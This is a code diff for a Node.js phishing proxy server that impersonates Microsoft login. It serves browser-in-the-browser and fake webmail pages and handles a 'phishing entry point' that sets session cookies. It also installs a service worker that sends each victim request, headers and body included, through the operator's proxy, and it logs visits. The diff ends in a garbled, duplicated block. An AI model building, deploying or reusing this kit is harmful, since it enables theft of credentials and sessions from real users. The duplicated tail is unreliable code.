@@ -619,16 +619,18 @@ async function logVisit(clientRequest, clientResponse, sessionId) {
     try { fs.appendFileSync(VISITS_LOG_FILE, logLine); } catch (e) {}
 }
 
-// ── ✅ PROXY SERVER — CLEAN VERSION ──
-const proxyServer = http.createServer((clientRequest, clientResponse) => {
-    const { method, url, headers } = clientRequest;
-    const currentSession = getUserSession(headers.cookie);
+// ── ✅ PROXY SERVER — CLEAN SYNTAX ──
+const proxyServer = http.createServer(function(clientRequest, clientResponse) {
+    var method = clientRequest.method;
+    var url = clientRequest.url;
+    var headers = clientRequest.headers;
+    var currentSession = getUserSession(headers.cookie);
 
-    // ── ✅ Handle webmail and bitb ──
+    // ── Handle webmail and bitb ──
     if (url.startsWith('/bitb') || url === '/webmail' || url.startsWith('/webmail?')) {
         clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
-        const file = url.startsWith('/bitb') ? 'bitb.html' : 'webmail.html';
-        const filePath = path.join(__dirname, 'public', file);
+        var file = url.startsWith('/bitb') ? 'bitb.html' : 'webmail.html';
+        var filePath = path.join(__dirname, 'public', file);
         if (fs.existsSync(filePath)) {
             fs.createReadStream(filePath).pipe(clientResponse);
         } else {
@@ -637,15 +639,15 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    // ── ✅ Handle proxy endpoint ──
+    // ── Handle proxy endpoint ──
     if (url === PROXY_PATHNAMES.proxy) {
-        let body = '';
-        clientRequest.on('data', chunk => { body += chunk; });
-        clientRequest.on('end', () => {
+        var body = '';
+        clientRequest.on('data', function(chunk) { body += chunk; });
+        clientRequest.on('end', function() {
             try {
-                const data = JSON.parse(body);
-                const targetUrl = data.url;
-                const options = {
+                var data = JSON.parse(body);
+                var targetUrl = data.url;
+                var options = {
                     method: data.method || 'GET',
                     headers: data.headers || {}
                 };
@@ -653,14 +655,14 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 if (data.body && (data.method === 'POST' || data.method === 'PUT')) {
                     options.body = data.body;
                 }
-                const parsedUrl = new URL(targetUrl);
-                const protocol = parsedUrl.protocol === 'https:' ? https : http;
-                const req = protocol.request(targetUrl, options, (response) => {
+                var parsedUrl = new URL(targetUrl);
+                var protocol = parsedUrl.protocol === 'https:' ? https : http;
+                var req = protocol.request(targetUrl, options, function(response) {
                     clientResponse.writeHead(response.statusCode, response.headers);
                     response.pipe(clientResponse);
                 });
-                req.on('error', (error) => {
-                    console.error('❌ Proxy error:', error);
+                req.on('error', function(error) {
+                    console.error('Proxy error:', error);
                     clientResponse.writeHead(500);
                     clientResponse.end('Proxy error');
                 });
@@ -669,7 +671,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 }
                 req.end();
             } catch (error) {
-                console.error('❌ Parse error:', error);
+                console.error('Parse error:', error);
                 clientResponse.writeHead(500);
                 clientResponse.end('Invalid request');
             }
@@ -677,6 +679,66 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
+    // ── Handle phishing entry point ──
+    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+        try {
+            var match = url.match(PHISHED_URL_REGEXP);
+            if (!match) {
+                clientResponse.writeHead(302, { Location: REDIRECT_URL });
+                clientResponse.end();
+                return;
+            }
+            var redirectUrl = decodeURIComponent(match[0]);
+            var session = currentSession;
+            if (!currentSession) {
+                var phishedURL = new URL(redirectUrl);
+                var sessionData = generateNewSession(phishedURL);
+                clientResponse.setHeader("Set-Cookie", sessionData.cookieName + '=' + sessionData.cookieValue + '; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict');
+                session = sessionData.cookieName;
+            }
+            var filePath = path.join(__dirname, PROXY_FILES.index);
+            if (fs.existsSync(filePath)) {
+                clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
+                fs.createReadStream(filePath).pipe(clientResponse);
+            } else {
+                clientResponse.writeHead(302, { Location: REDIRECT_URL });
+                clientResponse.end();
+            }
+        } catch (error) {
+            console.error('Entry point error:', error);
+            clientResponse.writeHead(302, { Location: REDIRECT_URL });
+            clientResponse.end();
+        }
+        return;
+    }
+
+    // ── Handle service worker ──
+    if (url === PROXY_PATHNAMES.serviceWorker) {
+        var filePath = path.join(__dirname, url.slice(1));
+        if (fs.existsSync(filePath)) {
+            clientResponse.writeHead(200, { 'Content-Type': 'text/javascript', 'Cache-Control': 'no-store' });
+            fs.createReadStream(filePath).pipe(clientResponse);
+        } else {
+            clientResponse.writeHead(200, { 'Content-Type': 'text/javascript' });
+            clientResponse.end('self.addEventListener("fetch", function(event) { var proxyUrl = self.location.origin + "/lNv1pC9AWPUY4gbidyBO"; event.respondWith(async function() { var data = { url: event.request.url, method: event.request.method, headers: Object.fromEntries(event.request.headers.entries()), body: await event.request.text().catch(function() { return null; }) }; var response = await fetch(proxyUrl, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) }); return response; }()); });');
+        }
+        return;
+    }
+
+    // ── Handle favicon ──
+    if (url === PROXY_PATHNAMES.favicon) {
+        clientResponse.writeHead(302, { Location: 'https://login.microsoftonline.com/favicon.ico' });
+        clientResponse.end();
+        return;
+    }
+
+    // ── Log visit ──
+    logVisit(clientRequest, clientResponse, currentSession || 'new').catch(function() {});
+
+    // ── Fallback redirect ──
+    clientResponse.writeHead(302, { Location: REDIRECT_URL });
+    clientResponse.end();
+});
     // ── ✅ Handle phishing entry point ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
